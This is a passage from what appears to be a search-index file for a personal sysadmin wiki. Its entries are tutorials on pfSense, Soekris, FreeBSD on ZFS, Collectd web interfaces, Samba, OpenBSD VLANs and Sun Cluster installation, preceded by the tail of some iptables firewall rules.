mac --mac-source '00:02:3f:13:bb:21' -j ACCEPT #\tG - Lionel Laptop echo \" Lionel\" iptables -t nat -I PREROUTING \\ -m mac --mac-source '00:0D:60:2C:12:95' -j ACCEPT #\tH - WIFI ROUTER echo \" WIFI ROUTER\" iptables -t nat -I PREROUTING \\ -m mac --mac-source '00:0F:66:33:20:12' -j ACCEPT echo \"############################## END ===\u003e Firewall Rules ###################################\" iptables -t nat -I PREROUTING -s $LINUX -j ACCEPT iptables -t nat -I PREROUTING -s $LINUX2 -j ACCEPT iptables -t nat -I PREROUTING -s 172.16.1.1/32 -j ACCEPT iptables -t nat -I PREROUTING -s 172.16.1.2/32 -j ACCEPT iptables -t nat -I PREROUTING -s 172.16.1.3/32 -j ACCEPT iptables -t nat -I PREROUTING -s 172.16.1.4/32 -j ACCEPT iptables -t nat -I PREROUTING -s 172.16.1.5/32 -j ACCEPT iptables -t nat -I PREROUTING -s 192.168.2.95/32 -j ACCEPT "
            }
        );
    index.add(
            {
                id:  414 ,
                href: "\/Installer_pfSense_sur_Soekris\/",
                title: "Installing pfSense on Soekris",
                description: "A guide on how to install pfSense on a Soekris net5501 hardware platform including solutions for common issues.",
                content: "Introduction linkI spent too much time trying to find how to install pfSense on a Soekris net5501. Why? Because no PXE versions exist or are easily installable, and also due to configuration and connection issues. To help others save time and for my own reference, I’ve decided to write this article.\nInstallation linkLet’s say I have a hard drive to install pfSense on. I connected it to my Ubuntu Desktop laptop through a USB external 2.5\" box and used KVM/QEMU. Here are the required packages:\naptitude install kvm virt-manager Do not forget to add your user to the ‘kvm’ group.\nNow use virt-manager to create a VM with:\nCDROM: the pfSense ISO HDD: the direct USB box Then boot the VM and perform the installation.\nConfiguration link1st boot linkFor the first configuration part, you should install the hard drive in the Soekris box and boot it. I’m using minicom and I’ve set these serial parameters as: 9600 7E1\nThen you’ll likely encounter this issue:\nTrying to mount root from ufs:/dev/ad0s1a Trying to mount root from ufs:/dev/ad0s1a Trying to mount root from ufs:/dev/ad0s1a Manual root filesystem specification: : Mount using filesystem eg. ufs:da0s1a ? List valid disk boot devices Abort manual input This is because the device during installation didn’t get the same device name on the Soekris. There is a way to fix this. Try something like this:\nmountroot\u003e ? List of GEOM managed disk devices: ufsid/4cf95e52836e2e4f ad1s1c ad1s1b ad1s1a ad1s1 ad1 Manual root filesystem specification: : Mount using filesystem eg. ufs:da0s1a ? List valid disk boot devices Abort manual input Now we’re going to boot on the correct root slice:\nufs:ad1s1a Web interface linkNow the web interface is available through port 0 on IP 192.168.1.1. The default credentials are:\nLogin: admin Password: pfsense Proceed with your desired configuration.\nRemote connection linkNow you’re able to set default connections. I mean correct default serial parameters and no exotic ones, as well as the SSH server. Go to System -\u003e Advanced to enable it.\nFstab linkTo avoid manually mounting the root filesystem at next boot, we’ll change the fstab file through our new SSH connection. Change the device values to the correct ones. For me, I had to change from ad0 to ad1 (/etc/fstab):\n# Device Mountpoint FStype Options Dump Pass# /dev/ad1s1a / ufs rw 1 1 /dev/ad1s1b none swap sw 0 0 Soekris linkNow reboot and set the connection parameters to 9600 to get the hardware and OS at the same configuration level.\nThat’s all :-)\n"
            }
        );
    index.add(
            {
                id:  415 ,
                href: "\/Upgrader_le_BIOS_de_la_Soekris\/",
                title: "Upgrading the Soekris BIOS",
                description: "How to upgrade the BIOS firmware on a Soekris device",
                content: "Introduction linkI strongly recommend upgrading the BIOS whenever an update is available: https://www.soekris.com/downloads.htm\nSince it’s not necessarily obvious how to do it, I’ll explain the process.\nInstallation linkA small package will be needed:\napt-get install lrzsz Upgrading link Connect to your BIOS monitor using minicom and run the download command: \u003e download Or try this if it doesn’t work:\n\u003e download - We’ll send the file using sx: $ sx -X ~/b5501_133.bin \u003e /dev/ttyUSB0 \u003c /dev/ttyUSB0 Sending b5501_133c.bin, 784 blocks: Give your local XMODEM receive command now. Xmodem sectors/kbytes sent: 96/12kRetry 0: NAK on sector Xmodem sectors/kbytes sent: 97/12kRetry 0: NAK on sector Xmodem sectors/kbytes sent: 131/16kRetry 0: NAK on sector Xmodem sectors/kbytes sent: 132/16kRetry 0: NAK on sector Xmodem sectors/kbytes sent: 528/66kRetry 0: NAK on sector Xmodem sectors/kbytes sent: 529/66kRetry 0: NAK on sector Xmodem sectors/kbytes sent: 578/72kRetry 0: NAK on sector Xmodem sectors/kbytes sent: 579/72kRetry 0: NAK on sector Bytes Sent: 100352 BPS:1519 Transfer complete Once completed, flash and reboot:\n\u003e flashupdate ?Updating BIOS Flash ,,,,,,,,,,,,,,,,,,,,,,,,,,,,..,,,,.... Done. \u003e reboot Reference link https://soekris.kd85.com/flashupdate_4801 https://mguesdon.oxymium.net/blog/?postid=128 https://www.mail-archive.com/soekris-tech@lists.soekris.com/msg04537.html https://wiki.soekris.info/Updating_Bios#Minicom "
            }
        );
    index.add(
            {
                id:  416 ,
                href: "\/Collectd_:_Installation_et_configuration_de_Collectd\/",
                title: "Collectd: Installation and Configuration",
                description: "Guide to installing and configuring Collectd, a system statistics collection daemon, on various platforms including Debian and Solaris",
                content: "Introduction linkCollectd gathers statistics about the system it is running on and stores this information. Those statistics can then be used to find current performance bottlenecks (i.e. performance analysis) and predict future system load (i.e. capacity planning). Or if you just want pretty graphs of your private server and are fed up with some homegrown solution you’re at the right place, too ;).\nAfter this installation, you’ll likely want access through a web interface. Feel free to continue with these documentations.\nInstallation linkWhether it’s on the server or client, it’s quite convenient, it’s the same package that needs to be installed.\nDebian linkOn Debian, it’s always as simple as:\naptitude install collectd Client linkDebian linkOn Debian, it’s always as simple as:\naptitude install collectd Solaris linkOn Solaris, it’s available on SunFreeware:\nwget \"http://collectd.org/files/collectd-4.6.2-0-SunOS-5.10-x86_64.pkg\" pkgadd -d collectd-4.6.2-0-SunOS-5.10-x86_64.pkg Configuration linkServer linkFor the server, we’re going to make sure these modules are activated (uncommented):\n... LoadPlugin \"logfile\" LoadPlugin \"network\" LoadPlugin \"rrdtool\" ... Then we’re going to add the IP on which the Collectd server should listen:\n... # Server "
            }
        );
    index.add(
            {
                id:  417 ,
                href: "\/problemes_d%5C%27enregistrements_de_fichiers_de_type_office,_adobe...",
                title: "Problems with saving Office, Adobe... file types",
                description: "How to solve issues with saving Office and Adobe files on Samba shares by disabling oplocks or veto files.",
                content: "Solving Office files saving issues linkIf you encounter problems saving office files on Samba shares, it’s likely due to Oplock. Oplock is a feature increasingly used by software developers as it allows much faster saving than normal.\nIt seems that this problem occurs from version 3.0.6 of Samba.\nTo avoid these issues, you need to disable this feature. Here’s what you need to insert in the Samba configuration file in the “Global” section:\n# Resolve office save problems oplocks = no Restart Samba afterwards.\nIf this solution still doesn’t work for you, then it might be because of “veto files”. Disable temporary files at the share level:\n# veto files = /*.tmp*/*.TMP*/ Be careful with .DSStore file blocking on Mac which can crash network shares since version 10.6 of Mac OS.\n"
            }
        );
    index.add(
            {
                id:  418 ,
                href: "\/Installation_FreeBSD_sur_ZFS\/",
                title: "Installing FreeBSD on ZFS",
                description: "A comprehensive guide on how to install FreeBSD with ZFS as the root filesystem, including disk formatting, partitioning, and system configuration.",
                content: "Introduction linkI love ZFS and for building a large NAS, I need FreeBSD which is capable of implementing ZFS and, most importantly, using it on the root partition as well.\nFor this purpose, I needed 5 disks of the same capacity and the FreeBSD DVD (I emphasize the DVD because the livefs or CD versions don’t contain everything needed to boot from ZFS).\nDisk Formatting linkCreating Partitions linkBoot from the FreeBSD DVD and launch the Fixit menu.\nOnce inside, I recommend checking the names of the devices installed on your system:\n\u003e ls /dev/ad* /dev/ad10 /dev/ad12 /dev/ad4 /dev/ad6 /dev/ad8 Before creating partitions and slices, note that you can check the status of your disks at any time with:\ngpart show ad10 Let’s define the disks format as GPT:\ngpart create -s gpt ad10 gpart create -s gpt ad12 gpart create -s gpt ad4 gpart create -s gpt ad6 gpart create -s gpt ad8 Then we’ll create a boot partition:\ngpart add -b 34 -s 128 -t freebsd-boot ad10 gpart add -b 34 -s 128 -t freebsd-boot ad12 gpart add -b 34 -s 128 -t freebsd-boot ad4 gpart add -b 34 -s 128 -t freebsd-boot ad6 gpart add -b 34 -s 128 -t freebsd-boot ad8 And a swap partition (4GB for example):\ngpart add -b 162 -s 8388608 -t freebsd-swap -l swap0 ad10 gpart add -b 162 -s 8388608 -t freebsd-swap -l swap1 ad12 gpart add -b 162 -s 8388608 -t freebsd-swap -l swap2 ad4 gpart add -b 162 -s 8388608 -t freebsd-swap -l swap3 ad6 gpart add -b 162 -s 8388608 -t freebsd-swap -l swap4 ad8 To calculate the size in cylinders, here’s the simple formula in MB with an example for our 4GB:\ncylinder size = x * 4 * 512 8388608 = 4096 * 4 * 512 And finally, the data partitions where the raid-z will reside:\ngpart add -b 8388770 -s 125829120 -t freebsd-zfs -l disk0 ad12 gpart add -b 8388770 -s 125829120 -t freebsd-zfs -l disk1 ad10 gpart add -b 8388770 -s 125829120 -t freebsd-zfs -l disk2 ad4 gpart add -b 8388770 -s 125829120 -t freebsd-zfs -l disk3 ad6 gpart add -b 8388770 -s 125829120 -t freebsd-zfs -l disk4 ad8 You should adjust according to the remaining space (see ‘gpart show’ to know how much space is left). We install the protected MBR and gptzfsboot on each disk:\ngpart bootcode -b /mnt2/boot/pmbr -p /mnt2/boot/gptzfsboot -i 1 ad12 gpart bootcode -b /mnt2/boot/pmbr -p /mnt2/boot/gptzfsboot -i 1 ad10 gpart bootcode -b /mnt2/boot/pmbr -p /mnt2/boot/gptzfsboot -i 1 ad4 gpart bootcode -b /mnt2/boot/pmbr -p /mnt2/boot/gptzfsboot -i 1 ad6 gpart bootcode -b /mnt2/boot/pmbr -p /mnt2/boot/gptzfsboot -i 1 ad8 Creating the ZFS linkWe’ll need to load the ZFS modules:\nkldload /mnt2/boot/kernel/opensolaris.ko kldload /mnt2/boot/kernel/zfs.ko And finally we create the raidz:\nmkdir /boot/zfs zpool create zroot raidz1 /dev/gpt/disk0 /dev/gpt/disk1 /dev/gpt/disk2 /dev/gpt/disk2 /dev/gpt/disk3 /dev/gpt/disk4 zpool set bootfs=zroot zroot Now we’ll create the necessary mount points and ZFS options to install the system. We enable checksum validation on the filesystem:\nzfs set checksum=fletcher4 zroot We create a partition for /tmp with some useful options:\nzfs create -o compression=on -o exec=on -o setuid=off zroot/tmp chmod 1777 /zroot/tmp And that’s it for the ZFS part.\nInstalling FreeBSD linkWe’ll decompress part of what’s on the DVD into our freshly created zpool:\ncd /dist/8.0-* export DESTDIR=/zroot for dir in base catpages dict doc games info lib32 manpages ports; do (cd $dir ; ./install.sh) ; done cd src ; ./install.sh all cd ../kernels ; ./install.sh generic cd /zroot/boot ; cp -Rlp GENERIC/* /zroot/boot/kernel/ Let’s chroot into our new environment:\nchroot /zroot And configure the rc.conf file:\nzfs_enable=\"YES\" hostname=\"freebsd.deimos.fr\" ifconfig_re0=\"DHCP\" And the bootloader file:\nzfs_load=\"YES\" vfs.root.mountfrom=\"zfs:zroot\" Configuration linkLet’s configure the root password:\npasswd The timezone:\ntzsetup The mail aliases:\ncd /etc/mail make aliases We unmount and exit the chroot:\numount /dev exit And we copy the zpool cache:\ncp /boot/zfs/zpool.cache /zroot/boot/zfs/zpool.cache We create the fstab file (/zroot/etc/fstab):\n# Device Mountpoint FStype Options Dump Pass# /dev/gpt/swap0 none swap sw 0 0 /dev/gpt/swap1 none swap sw 0 0 /dev/gpt/swap2 none swap sw 0 0 /dev/gpt/swap3 none swap sw 0 0 /dev/gpt/swap4 none swap sw 0 0 We unmount the zpool:\nexport LD_LIBRARY_PATH=/mnt2/lib zfs unmount -a And we configure the mount points of our ZFS:\nzfs set mountpoint=legacy zroot zfs set mountpoint=/tmp zroot/tmp All that’s left is to exit the fixit mode and the sysinstall to reboot.\nFAQ linkRaidZ2 degraded linkWhat happens if you have a disk in degraded mode? First, let’s check the status to see what’s happening:\n\u003e zpool status -x pool: zroot state: DEGRADED status: One or more devices could not be opened. Sufficient replicas exist for the pool to continue functioning in a degraded state. action: Attach the missing device and online it using 'zpool online'. see: http://www.sun.com/msg/ZFS-8000-2Q scrub: none requested ... Here we can see the “DEGRADED” status. To put it simply:\nIf the machine is running: replace the defective disk with a new one. If the machine is off or if you want to shut it down: boot from the FreeBSD DVD, load the ZFS modules. Then recreate the partitions as you did for the other disks. Next, we’ll add the new disk to the raidz2 so it automatically rebuilds what’s needed:\nzpool replace zroot /dev/gpt/disk3 Here, my disk3 was defective, so I recreated exactly the same partitions on the new disk and added it. When we do a status check, we can see that the other disks are rebuilding the new one:\n\u003e zpool status pool: zroot state: DEGRADED status: One or more devices is currently being resilvered. The pool will continue to function, possibly in a degraded state. action: Wait for the resilver to complete. scrub: resilver in progress for 0h4m, 92.79% done, 0h0m to go config: NAME STATE READ WRITE CKSUM zroot DEGRADED 0 0 0 raidz2 DEGRADED 0 0 0 gpt/disk0 ONLINE 0 0 0 4.63M resilvered gpt/disk1 ONLINE 0 0 0 4.63M resilvered gpt/disk2 ONLINE 0 0 0 4.59M resilvered replacing DEGRADED 0 0 0 10045559159691639333 UNAVAIL 0 1.49K 0 was /dev/gpt/disk3/old gpt/disk3 ONLINE 0 0 0 8.22G resilvered gpt/disk4 ONLINE 0 0 0 4.63M resilvered errors: No known data errors Once completed, you can either reboot if you chose the solution of booting from the FreeBSD DVD, or do nothing if your machine was already running.\nResources linkhttp://wiki.freebsd.org/RootOnZFS/GPTZFSBoot/RAIDZ1 Documentation on How to install FreeBSD 7.0 under ZFS http://www.sun.com/bigadmin/features/articles/zfs_part2_ease.jsp\n"
            }
        );
    index.add(
            {
                id:  419 ,
                href: "\/Monitorer_la_temperature_des_processeurs_sous_FreeBSD\/",
                title: "Monitoring CPU Temperature on FreeBSD",
                description: "How to monitor the temperature of all CPU cores on FreeBSD",
                content: "Introduction linkHere’s how to monitor the temperature of all your CPU cores on FreeBSD.\nConfiguration linkFortunately, there’s nothing to install. We’ll simply load the temperature module:\nkldload coretemp If you want to enable it each time your machine boots:\n# /boot/loader.conf coretemp_load=\"YES\" PS: For AMD users, there are also the k8temp and amdtemp modules available.\nUsage linkNow, you can easily check your temperatures:\n\u003e sysctl dev.cpu | grep temperature dev.cpu.0.temperature: 48.0C dev.cpu.1.temperature: 50.0C dev.cpu.2.temperature: 47.0C dev.cpu.3.temperature: 46.0C References linkhttp://blog.freelooser.fr/2009/05/temperature-du-cpu-sous-freebsd.html\n"
            }
        );
    index.add(
            {
                id:  420 ,
                href: "\/apt-cacher-ng-mise-en-place-d-un-proxy-pour-apt\/",
                title: "Apt-cacher-ng: Setting Up a Proxy for APT",
                description: "How to set up and configure Apt-cacher-ng, a caching proxy for Debian/Ubuntu package repositories",
                content: "Introduction linkWithout having an amazing internet connection and using virtual machines, it quickly becomes tedious to wait ages to download the same packages for all these VMs. So I looked for a solution to have a kind of cache specifically for apt.\nI found happiness with apt-cacher-ng which, from what I’ve read, is the most complete solution available today.\nInstallation linkAs usual, it’s simple:\naptitude install apt-cacher-ng My server has the IP 192.168.100.1. If you want to modify some small options, I invite you to look at the file /etc/apt-cacher-ng/acng.conf.\nThen restart the service.\nConfiguration linkThis part is fairly easy, as we’ll tell the apt service to use a proxy. We’ll set it up on both the server and clients:\nAcquire::http { Proxy \"http://192.168.100.1:3142\"; }; Then we update everything:\naptitude update Usage linkBy default, there’s a small graphical interface that allows you to update, import, verify, manage expiration, etc. The address is: http://192.168.100.1:3142/acng-report.html\n"
            }
        );
    index.add(
            {
                id:  421 ,
                href: "\/Trouver_le_process_qui_tourne_sur_un_certain_port_sur_Solaris\/",
                title: "Finding a Process Running on a Specific Port on Solaris",
                description: "Methods to find which process is using a specific port on Solaris operating system.",
                content: "Introduction linkSince netstat -auntpl doesn’t exist on Solaris, I had to do some research to find out how to determine which process is listening on a specific port.\nSolutions 1 linkYou’ll need to create a small script:\n(get_process_from_port.sh)\n#!/bin/ksh line='---------------------------------------------' pids=$(/usr/bin/ps -ef | sed 1d | awk '{print $2}') if [ $# -eq 0 ]; then read ans?\"Enter port you would like to know pid for: \" else ans=$1 fi for f in $pids do /usr/proc/bin/pfiles $f 2\u003e/dev/null | /usr/xpg4/bin/grep -q \"port: $ans\" if [ $? -eq 0 ]; then echo $line echo \"Port: $ans is being used by PID:\\c\" /usr/bin/ps -ef -o pid -o args | egrep -v \"grep|pfiles\" | grep $f fi done exit 0 Run the script and enter the port number when prompted.\nSolution 2 link fuser -n tcp port "
            }
        );
    index.add(
            {
                id:  422 ,
                href: "\/VLAN_:_Cr%C3%A9er_une_interface_VLAN_sous_OpenBSD\/",
                title: "VLAN: Creating a VLAN Interface on OpenBSD",
                description: "How to create and configure VLAN interfaces on OpenBSD systems, both dynamically and statically.",
                content: "Introduction linkA virtual local area network, commonly called VLAN (for Virtual LAN), is an independent logical computer network. Many VLANs can coexist on the same network switch.\nConfiguration linkDynamique linkTo create a VLAN interface on the fly:\nifconfig vlan110 create Then assign a tag (VLAN ID) to this VLAN as well as the physical interface on which it should be created:\nifconfig vlan110 vlan 110 vlandev sis1 And finally, assign it a specific IP address:\nifconfig vlan110 inet 192.168.110.254 netmask 255.255.255.0 Statique linkNow, to keep this configuration active when the machine restarts (/etc/hostname.vlan110):\ninet 192.168.110.254 255.255.255.0 NONE vlan 110 vlandev sis1 "
            }
        );
    index.add(
            {
                id:  423 ,
                href: "\/Heymon_:_Une_interface_web_pour_Collectd\/",
                title: "Heymon: A Web Interface for Collectd",
                description: "Guide on how to install and configure Heymon, a web interface for Collectd that allows comparing metrics between different machines.",
                content: "Introduction linkHeymon is one of the most advanced interfaces currently available for Collectd. In my opinion, it’s complementary to other interfaces since it allows comparisons between different machines. However, it’s quite complicated to set up.\nInstallation linkLet’s install everything we need via Debian packages:\naptitude install unzip librrd-ruby rubygems1.9 libyaml-ruby libzlib-ruby libdbd-sqlite3-ruby mongrel libopenssl-ruby1.8 Then we download the project source code:\ncd /var/www wget \"http://github.com/newobj/heymon/zipball/master\" unzip newobj-heymon-25ceb0e.zip mv newobj-heymon-25ceb0e heymon cd heymon Next, we’ll need to install gem if you don’t have it already (or update it if it’s already the case):\nwget \"http://rubyforge.org/frs/download.php/70697/rubygems-1.3.7.zip\" unzip rubygems-1.3.7.zip cd rubygems-1.3.7 ruby1.9 ./setup.rb And install some Ruby modules:\ngem install rake gem install right_aws gem install haml gem install -v=2.3.5 rails Configuration linkNow we’ll configure what’s needed to run Heymon. Let’s generate what’s necessary for the SQLite database:\ncd .. rake db:migrate Edit the configuration file and adapt it if needed (/var/www/heymon/config/environment.rb):\n... RAILS_GEM_VERSION = '2.3.5' unless defined? RAILS_GEM_VERSION COLLECTD_RRD = '/var/lib/collectd/rrd/' RRDTOOL_BIN = '/usr/bin/rrdtool' ... Launching linkNow all that’s left is to launch the application:\n/var/www/heymon/script/server -d Now try to access the following URL: http://192.168.0.48:3000.\n"
            }
        );
    index.add(
            {
                id:  424 ,
                href: "\/Jarmon_:_Une_interface_web_pour_Collectd\/",
                title: "Jarmon: A Web Interface for Collectd",
                description: "This article explains how to install and configure Jarmon, a web interface for Collectd that allows for clear visualization and zooming of monitoring data.",
                content: "Introduction linkJarmon is another interface for Collectd. I like this one because it’s clean and allows zooming. However, at the moment it only works on a host-by-host basis. This means that in the configuration, you need to specify a particular host.\nInstallation linkFor the installation, we need a web server:\naptitude install apache2 bzr Configuration linkLet’s retrieve the source code:\nmkdir -p /var/www/ cd /var/www bzr branch lp:~richardw/jarmon/trunk mv trunk jarmon chown -Rf www-data. jarmon cd jarmon Now we create a symbolic link to the directory containing the RRD files of the machine we want to monitor:\nln -s /var/lib/collectd/rrd/localhost data Now you can access the web interface: http://collectd-server/jarmon\n"
            }
        );
    index.add(
            {
                id:  425 ,
                href: "\/Mise_en_place_d\u0027un_quorum_server\/",
                title: "Setting up a quorum server",
                description: "Instructions for setting up and configuring a quorum server for a 2-node cluster without a disk array",
                content: "Introduction linkTHIS IS NEEDED ONLY FOR A 2 NODES CLUSTER WITHOUT A DISKS ARRAY!\nYou generally need it when you have 2 servers without a SAN, so you need a third machine with this service installed and launched for your quorum.\nInstallation linkNormally the Quorum Server software is installed with the Sun Cluster Software.\nConfiguration linkJust configure the file /etc/scqsd/scqsd.conf with this line:\n/usr/cluster/lib/sc/scqsd -d /var/scqsd -i quorum_name -p 9001 quorum_name: is the instance name of the quorum server 9001: is the default listening port of quorum server After that, just launch the quorum server instance:\nscadm restart svc:/system/cluster/quorumserver:default "
            }
        );
    index.add(
            {
                id:  426 ,
                href: "\/Installation_of_Sun_Cluster_(old)\/",
                title: "Installation of Sun Cluster",
                description: "Guide for installing and configuring Sun Cluster software on Solaris systems.",
                content: "Introduction linkThis is not very complicated. You just have to follow this documentation\nInstallation linkFor the installation, download the Availability Suite on Sun Website.\nFirst Node linkAfter downloading it, then unzip and launch the installer:\ncd ./java_es_05Q4_cluster/Solaris_x86 ./installer Read license and accept it: Welcome to the Sun Java(TM) Enterprise System; serious software made simple.. Before you begin, please refer to the Release Notes and Installation Guides for Sun Java Enterprise System and Sun Cluster software at http://docs.sun. com. Copyright 2005 Sun Microsystems, Inc. All rights reserved. Use is subject to license terms. Before you install this product, you must read and accept the entire Software License Agreement under which this product is licensed for your use . Press “Enter”\nIf you have read and accept all the terms of the entire Software License Agreement, answer 'yes', and the installation will continue. If you do not accept all the terms of the Software License Agreement, answer 'no', and the installation program will end without installing the product. Have you read, and do you accept, all of the terms of the preceding Software License Agreement [No] {\"\u003c\" goes back, \"!\" exits}? yes Say yes.\nNote that English will always be installed 1.French 2.Spanish 3.Korean 4.Traditional Chinese 5.Simplified Chinese 6.German 7.Japanese 8.English only Please enter a comma separated list of languages you would like supported with this installation [8] {\"\u003c\" goes back, \"!\" exits} Don’t choose anything! Stay in english mode:\nInstallation Type ----------------- Do you want to install the full set of Sun Java(TM) Enterprise System Products and Services? (yes/no) [Yes] {\"\u003c\" goes back, \"!\" exits} yes Say yes for the full install:\nShared Component Upgrades Required ----------------------------------- The shared components listed below are currently installed. They will be upgraded for compatibility with the products you chose to install. Component Package -------------------- JavaActivationFramework SUNWjaf 8.0.0.0 (installed) 8.1 (required) JavaMail SUNWjmail 8.0.0.0 (installed) 8.1 (required) Enter 1 to upgrade these shared components and 2 to cancel [1] {\"\u003c\" goes back, \"!\" exits}: 1 Choose upgrade:\nEnter 1 to upgrade\nChecking System Status Available disk space... : OK Memory installed... : OK Operating system patches...: OK Operating system resources...: OK System ready for installation Enter 1 to continue [1] {\"\u003c\" goes back, \"!\" exits} 1 Enter 1 to continue.\nScreen for selecting Type of Configuration 1. Configure Now - Selectively override defaults or express through 2. Configure Later - Manually configure following installation Select Type of Configuration [1] {\"\u003c\" goes back, \"!\" exits} 2 Continue but configure later:\nConfigure Later - Manually configure following installation Ready to Install ---------------- The following components will be installed. Product: Java Enterprise System Location: /var/sadm/prod/entsys Space Required: 110.15 MB ------------------------------- Sun Cluster 3.1 8/05 Sun Cluster Core Sun Cluster Agents for Sun Java(TM) System HA/Scalable Sun Java System Web Server HA Sun Java System Application Server HA Sun Java System Message Queue HA Sun Java System Calendar Server HA Sun Java System Administration Server HA Sun Java System Directory Server 1. Install 2. Start Over 3. Exit Installation What would you like to do [1] {\"\u003c\" goes back, \"!\" exits}? 1 Choose 1 to install:\nInstall Java Enterprise System Sun Cluster |-1%--------------25%-----------------50%-----------------75%--------------100%| Installation Complete Software installation has completed successfully. You can view the installation summary and log by using the choices below. Summary and log files are available in /var/sadm/install/logs/. Your next step is to perform the postinstallation configuration and verification tasks documented in the Postinstallation Configuration and Startup Chapter of the Sun Java(TM) Enterprise System Installation Guide. See: http: //docs.sun.com/doc/819-2328. Enter 1 to view installation summary and Enter 2 to view installation logs [1] {\"!\" exits} Now you can do Ctrl+C to exit installation.\nThen you have to enter the new PATH:\nPATH=$PATH:/usr/cluster/bin MANPATH=$MANPATH:/usr/cluster/man:/usr/share/man Second Node link Your responses indicate the following options to scinstall: scinstall -ik \\ -C cluster3 \\ -N host08 \\ -A trtype=dlpi,name=bge3 -A trtype=dlpi,name=ce0 \\ -m endpoint=:bge3,endpoint=switch1 \\ -m endpoint=:ce0,endpoint=switch2 Are these the options you want to use (yes/no) [yes]? Do you want to continue with the install (yes/no) [yes]? At the end of installation of the first node:\nsconf -p | grep install For more verbosity:\nsconf -pvv | grep install Utilities link scinstall: cluster installation scsetup: modify configuration scstat: cluster stats \u003c 3.2 scconf: view / modify configuration \u003c 3.2 sconf -p: cluster configuration informations scrgadm: view / modify RG clinfo -n: node number With the 3.2 version, new commands arrived. You can also use both of command type.\nTo administrate the cluster, you have 2 web interfaces:\nhttps://node:6789 https://node:3000 Configuration linkAll your nodes and hostnames must be entered in /etc/hosts. It’s necessary for the configuration\nInformations: ALOM, LOM or RSC are like DRAC cards on Dell. First Node linkAfter downloading Sun Cluster, mount or burn the CD. Then launch the installation:\nscinstall *** Main Menu *** Please select from one of the following (*) options: * 1) Install a cluster or cluster node 2) Configure a cluster to be JumpStarted from this install server 3) Add support for new data services to this cluster node 4) Upgrade this cluster node 5) Print release information for this cluster node * ?) Help with menu options * q) Quit Option: Choose 1:\nInstall a cluster or cluster node *** Install Menu *** Please select from any one of the following options: 1) Install all nodes of a new cluster 2) Install just this machine as the first node of a new cluster 3) Add this machine as a node in an existing cluster ?) Help with menu options q) Return to the Main Menu Option: Choose 2:\nInstall just this machine as the first node of a new cluster *** Installing just the First Node of a New Cluster *** This option is used to establish a new cluster using this machine as the first node in that cluster. Once the cluster framework software is installed, you will be asked for the name of the cluster. Then, you will have the opportunity to run sccheck(1M) to test this machine for basic Sun Cluster pre-configuration requirements. After sccheck(1M) passes, you will be asked for the names of the other nodes which will initially be joining that cluster. Unless this is a single-node cluster, you will be also be asked to provide certain cluster transport configuration information. Press Control-d at any time to return to the Main Menu. Do you want to continue (yes/no) [yes]? Answer “yes”!\n\u003e\u003e\u003e Type of Installation \u003c\u003c\u003c There are two options for proceeding with cluster installation. For most clusters, a Typical installation is recommended. However, you might need to select the Custom option if not all of the Typical defaults can be applied to your cluster. For more information about the differences between the Typical and Custom installation methods, select the Help option from the menu. Please select from one of the following options: 1) Typical 2) Custom ?) Help q) Return to the Main Menu Option [1]: Choose 2:\nCustom \u003e\u003e\u003e Software Patch Installation \u003c\u003c\u003c If there are any Solaris or Sun Cluster patches that need to be added as part of this Sun Cluster installation, scinstall can add them for you. All patches that need to be added must first be downloaded into a common patch directory. Patches can be downloaded into the patch directory either as individual patches or as patches grouped together into one or more tar, jar, or zip files. If a patch list file is provided in the patch directory, only those patches listed in the patch list file are installed. Otherwise, all patches found in the directory will be installed. Refer to the patchadd(1M) man page for more information regarding patch list files. Do you want scinstall to install patches for you (yes/no) [yes]? no Choose no.\n\u003e\u003e\u003e Cluster Name \u003c\u003c\u003c Each cluster has a name assigned to it. The name can be made up of any characters other than whitespace. Each cluster name should be unique within the namespace of your enterprise. What is the name of the cluster you want to establish? Now choose the name of the cluster (eg. ClusterSolaris)\n\u003e\u003e\u003e Check \u003c\u003c\u003c This step allows you to run sccheck(1M) to verify that certain basic hardware and software pre-configuration requirements have been met. If sccheck(1M) detects potential problems with configuring this machine as a cluster node, a report of failed checks is prepared and available for display on the screen. Data gathering and report generation can take several minutes, depending on system configuration. Do you want to run sccheck (yes/no) [yes]? yes Choose yes\nsccheck: Requesting explorer data and node report from sola1. sccheck: sola1: Explorer finished. sccheck: sola1: Starting single-node checks. sccheck: sola1: Single-node checks finished. Press Enter to continue: Now press “Enter”\n\u003e\u003e\u003e Cluster Nodes \u003c\u003c\u003c This Sun Cluster release supports a total of up to 16 nodes. Please list the names of the other nodes planned for the initial cluster configuration. List one node name per line. When finished, type Control-D: Node name (Control-D to finish): Sola2 Unknown host. Node name (Control-D to finish): ^D This is the complete list of nodes: sola1 This is a single-node cluster. Is that correct (yes/no) [yes]? yes Enter the name of all the nodes. This node (first one is automatically inserted). Then press Ctrl+d and answer yes.\n\u003e\u003e\u003e Authenticating Requests to Add Nodes \u003c\u003c\u003c Once the first node establishes itself as a single node cluster, other nodes attempting to add themselves to the cluster configuration must be found on the list of nodes you just provided. You can modify this list using scconf(1M) or other tools once the cluster has been established. By default, nodes are not securely authenticated as they attempt to add themselves to the cluster configuration. This is generally considered adequate, since nodes which are not physically connected to the private cluster interconnect will never be able to actually join the cluster. However, DES authentication is available. If DES authentication is selected, you must configure all necessary encryption keys before any node will be allowed to join the cluster (see keyserv(1M), publickey(4)). Do you need to use DES authentication (yes/no) [no]? no If you really want to have encrypted DES authentication say yes. But I choose no, because it’s on the private interfaces.\n\u003e\u003e\u003e Network Address for the Cluster Transport \u003c\u003c\u003c The private cluster transport uses a default network address of 172.16.0.0. But, if this network address is already in use elsewhere within your enterprise, you may need to select another address from the range of recommended private addresses (see RFC 1918 for details). If you do select another network address, bear in mind that the Sun Cluster software requires that the rightmost two octets always be zero. The default netmask is 255.255.0.0. You can select another netmask, as long as it minimally masks all bits given in the network address. Is it okay to accept the default network address (yes/no) [yes]? yes Is it okay to accept the default netmask (yes/no) [yes]? yes Say yes to have the default network address.\n\u003e\u003e\u003e Point-to-Point Cables \u003c\u003c\u003c The two nodes of a two-node cluster may use a directly-connected interconnect. That is, no cluster transport junctions are configured. However, when there are greater than two nodes, this interactive form of scinstall assumes that there will be exactly two cluster transport junctions. Does this two-node cluster use transport junctions (yes/no) [yes]? yes Say yes.\n\u003e\u003e\u003e Cluster Transport Junctions \u003c\u003c\u003c All cluster transport adapters in this cluster must be cabled to a transport junction, or \"switch\". And, each adapter on a given node must be cabled to a different junction. Interactive scinstall requires that you identify two switches for use in the cluster and the two transport adapters on each node to which they are cabled. What is the name of the first junction in the cluster [switch1]? switch1 What is the name of the second junction in the cluster [switch2]? switch2 Give here the switches names.\n\u003e\u003e\u003e Cluster Transport Adapters and Cables 